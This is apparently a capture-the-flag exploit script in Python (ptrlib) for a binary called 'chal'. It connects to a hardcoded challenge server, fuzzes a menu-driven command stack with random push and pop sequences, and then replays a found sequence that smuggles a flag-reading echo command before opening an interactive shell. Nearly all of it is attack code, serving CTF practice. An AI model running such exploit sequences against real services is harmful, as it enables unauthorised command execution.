# from pwn import cyclic_gen
from ptrlib import *
import argparse
import string

binary = "./chal"
elf = ELF(binary)

parser = argparse.ArgumentParser()
parser.add_argument(
    "--host",
    default="127.0.0.1",
    help="target host"
)
parser.add_argument(
    "--port",
    default=3001,
    help="target port"
)
parser.add_argument(
    '--log',
    action='store_true'
)
parser.add_argument(
    '--fuzz',
    action='store_true'
)
parser.add_argument(
    '--remote',
    nargs=2,
    metavar=('REMOTE_HOST', 'REMOTE_PORT'),
    help='remote host and port'
)
args = parser.parse_args()

def main(fuzz=True):

    r = None
    """
    libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")
    """
    # libc = ELF("./libc.so.6")
    r = Socket("nc 52.231.220.191 5000")
    # """




    log = args.log
    is_remote = r is not None or args.remote is not None
    if r is None:
        if is_remote:
            host = args.remote[0]
            port = args.remote[1]
            r = Socket(host, port)
        else:
            r = Process(binary)


    def just_u64(x):
        return u64(x.ljust(8, b'\x00'))


    def wait_for_attach():
        if not is_remote:
            input('attach?')


    def sla(*args):
        r.sendlineafter(*args)


    def decrypt(cipher):
        key = 0
        plain = 0
        for i in range(1, 6):
            bits = 64 - 12 * i
            if bits < 0:
                bits = 0
            plain = ((cipher ^ key) >> bits) << bits
            key = plain >> 12
        return plain


    def encrypt(val, addr):
        return val ^ (addr >> 12)


    def push_whoami():
        r.sendlineafter(": ", "1")
        r.sendlineafter(": ", "2")
    def push_id():
        r.sendlineafter(": ", "1")
        r.sendlineafter(": ", "3")


    def push_echo(s):
        r.sendlineafter(": ", "1")
        r.sendlineafter(": ", "4")
        r.sendlineafter(": ", s)

    def pop_command(idx):
        r.sendlineafter(": ", "2")
        r.sendlineafter(": ", str(idx))

    def execute():
        r.sendlineafter(": ", "3")

    def clear_commands():
        r.sendlineafter(": ", "4")

    def show_commands():
        r.sendlineafter(": ", "5")
        s = r.recvuntil("1. Push").decode("ascii")
        pos = s.find("===============================")
        s = s[pos+len("==============================="):]
        pos = s.find("=")
        s = s[:pos].replace(" ", "_")
        return s.strip("\n").split("\n")
    
    def check(l):
        import re
        for x in l:
            if len(x) != 8:
                continue
            if re.match("^[A-Z]+$", x):
                return True
        return False

    def check_commands():
        l = show_commands()
        return check(l), len(l)
    
    assert(check(["id", "ABCDEFGH", "asdfa"]))

    """
    push_id()
    push_whoami()
    push_id()
    push_whoami()
    push_whoami()
    push_whoami()
    push_id()
    push_id()
    push_whoami()
    push_echo("ABCDEFGHIJKLNOPQRSTUVWYZ1235")
    push_whoami()
    push_echo("ABCDEFGHIJKLNOPQRSTUVWYZ1235")
    push_echo("abcat_flajkgg")
    push_echo("ABCDEFGHIJKLNOPQRSTUVWYZ1235")
    wait_for_attach()
    show_commands()
    for i in range(5):
        pop_command(0)
        show_commands()
    push_echo("ABCDEFGHIJKLNOPQRSTUVWYZ1235")
    for i in range(3):
        pop_command(0)
        show_commands()
    """

    target = "ABCDEFGHIJKLNOPQRSTUVWYZ12"

    import random
    import sys
    cmds = []




    push_id()
    push_whoami()
    push_id()
    push_whoami()
    push_echo(target)
# ['push_echo', 'push_echo', 'push_id', 'push_id', 'push_echo', 'push_id', 'push_id', 'push_id', 'push_whoami', 'push_echo', 'push_echo', 'pop_command_0', 'pop_command_1', 'pop_command_1', 'pop_command_1', 'pop_command_0', 'pop_command_0']
    if not fuzz:
        #l = ['push_id', 'push_echo', 'push_id', 'push_whoami', 'push_whoami', 'pop_command_0', 'pop_command_0', 'push_echo', 'push_whoami', 'push_echo', 'push_whoami', 'push_id', 'pop_command_0', 'pop_command_1', 'pop_command_1', 'push_id', 'push_id', 'push_id', 'push_whoami', 'push_whoami', 'push_whoami', 'push_whoami', 'push_echo', 'push_id', 'push_echo', 'push_echo', 'push_echo', 'pop_command_1', 'push_echo', 'push_echo', 'push_id', 'push_whoami', 'push_echo', 'push_whoami', 'push_echo', 'push_echo', 'pop_command_0', 'pop_command_0', 'pop_command_1', 'pop_command_1', 'pop_command_0', 'pop_command_0', 'pop_command_1', 'pop_command_0', 'pop_command_1']
        l = ['push_whoami', 'push_whoami', 'push_whoami', 'push_id', 'push_echo', 'push_whoami', 'push_whoami', 'push_id', 'push_echo', 'push_echo', 'push_whoami', 'push_id', 'push_whoami', 'push_echo', 'push_echo', 'pop_command_1', 'pop_command_1', 'pop_command_0', 'pop_command_0', 'pop_command_1', 'pop_command_0', 'pop_command_0', 'pop_command_0', 'pop_command_1', 'pop_command_0', 'push_whoami', 'push_whoami', 'push_whoami', 'push_whoami', 'push_echo', 'push_id', 'push_whoami', 'push_whoami', 'push_echo', 'push_id', 'push_whoami', 'push_id', 'push_echo', 'pop_command_1', 'pop_command_0', 'push_id', 'push_id', 'push_id', 'push_id', 'push_echo', 'pop_command_0', 'pop_command_1', 'pop_command_1', 'pop_command_0', 'pop_command_1', 'pop_command_0', 'pop_command_0', 'pop_command_1']
        for cmd in l:
            if cmd == 'push_id':
                push_id()
            elif cmd == 'push_whoami':
                push_whoami()
            elif cmd == 'push_echo':
                target = "ABCDEFGcIJKLNOPat_flagYZ"
                push_echo(target)
            elif cmd == 'pop_command_0':
                pop_command(0)
            elif cmd == 'pop_command_1':
                pop_command(1)
            else:
                print("??: "+ cmd)
                sys.exit(-1)
        r.sh()
        return

    for i in range(5):
        for i in range(30):
            flag, length = check_commands()
            if flag:
                print("found")
                print(cmds)
                r.sh()
                sys.exit(0)
            x = random.randint(0, 130)
            if x < 40:
                push_id()
                cmds.append("push_id")
            elif x < 80:
                push_whoami()
                cmds.append("push_whoami")
            elif x < 100:
                push_echo(target)
                cmds.append("push_echo")
            else:
                break
        if random.randint(0, 1) == 0:
            push_echo(target)
            cmds.append("push_echo")
        for i in range(10):
            idx = random.randint(0, 1)
            flag, length = check_commands()
            if flag:
                print("found")
                print(cmds)
                sys.exit(0)
            x = random.randint(0, 100)
            if x < 20:
                break
            pop_command(idx)
            cmds.append("pop_command_" + str(idx))
    print(cmds)
        
        

    # push_id()
    # push_whoami()
    # push_id()
    # push_whoami()
    # push_echo("ABCDEFGHIJKLMNOPQRSTUVWXYZ1234")

    # for i in range(3):
    #     print(check_commands())
    #     pop_command(0)
    # wait_for_attach()


    r.close()
def fuzz():
    for i in range(10):
        main()
def exploit():
    main(False)

#exploit()
if args.fuzz:
    fuzz()
else:
    exploit()
import sys
sys.exit(1)